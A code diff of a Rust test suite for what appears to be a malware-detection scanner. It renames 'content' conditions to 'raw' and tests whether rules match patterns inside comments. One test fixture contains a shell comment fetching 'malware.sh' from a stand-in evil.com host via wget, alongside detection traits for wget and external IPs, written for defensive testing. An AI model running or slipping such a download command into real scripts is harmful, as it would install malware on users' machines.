@@ -1,4 +1,4 @@
-//! Tests for string vs content condition behavior.
+//! Tests for string vs raw condition behavior.
 //!
 //! Verifies that `type: string` conditions search AST-extracted strings (excluding comments)
 //! while `type: raw` conditions search raw file content (including comments).
@@ -94,12 +94,12 @@ int main() {
 
 /// Test that `type: raw` conditions DO match patterns in comments.
 #[test]
-fn test_content_condition_matches_comments() {
+fn test_raw_condition_matches_comments() {
     let temp_dir = TempDir::new().unwrap();
     let script_path = temp_dir.path().join("test.sh");
 
     // Shell script with wget in a comment
-    // content-based rules should still find it
+    // type: raw rules should still find it
     let script_content = r#"#!/bin/bash
 # wget http://evil.com/malware.sh
 echo "This script is safe"
@@ -113,7 +113,7 @@ echo "This script is safe"
 
     let trait_content = r#"traits:
   - id: wget-in-comment
-    desc: wget found in content
+    desc: wget found in raw content
     crit: notable
     conf: 0.8
     if:
@@ -139,7 +139,7 @@ echo "This script is safe"
 
     let stdout = String::from_utf8_lossy(&output.get_output().stdout);
 
-    // Content search should find wget even in comment
+    // Raw search should find wget even in comment
     assert!(
         stdout.contains("wget-in-comment"),
         "type: raw should match patterns in comments. Output: {}",
@@ -147,9 +147,9 @@ echo "This script is safe"
     );
 }
 
-/// Test the difference between string and content for Python comments.
+/// Test the difference between string and raw for Python comments.
 #[test]
-fn test_python_string_vs_content() {
+fn test_python_string_vs_raw() {
     let temp_dir = TempDir::new().unwrap();
     let py_path = temp_dir.path().join("test.py");
 
@@ -181,10 +181,10 @@ def connect():
       external_ip: true
 "#;
 
-    // Content-based trait (should match both IPs)
-    let content_trait = r#"traits:
-  - id: content-ip-match
-    desc: IP via content search
+    // Raw-based trait (should match both IPs)
+    let raw_trait = r#"traits:
+  - id: raw-ip-match
+    desc: IP via raw search
     crit: notable
     conf: 0.8
     if:
@@ -194,7 +194,7 @@ def connect():
 "#;
 
     fs::write(traits_dir.join("string.yaml"), string_trait).unwrap();
-    fs::write(traits_dir.join("content.yaml"), content_trait).unwrap();
+    fs::write(traits_dir.join("raw.yaml"), raw_trait).unwrap();
 
     // Scan with custom traits
     // Note: --format and --traits-dir are global flags, must come before the subcommand
@@ -212,9 +212,9 @@ def connect():
 
     let stdout = String::from_utf8_lossy(&output.get_output().stdout);
 
-    // Content should always match (finds both IPs)
+    // Raw should always match (finds both IPs)
     assert!(
-        stdout.contains("content-ip-match"),
+        stdout.contains("raw-ip-match"),
         "type: raw should find IPs in both comments and strings. Output: {}",
         stdout
     );
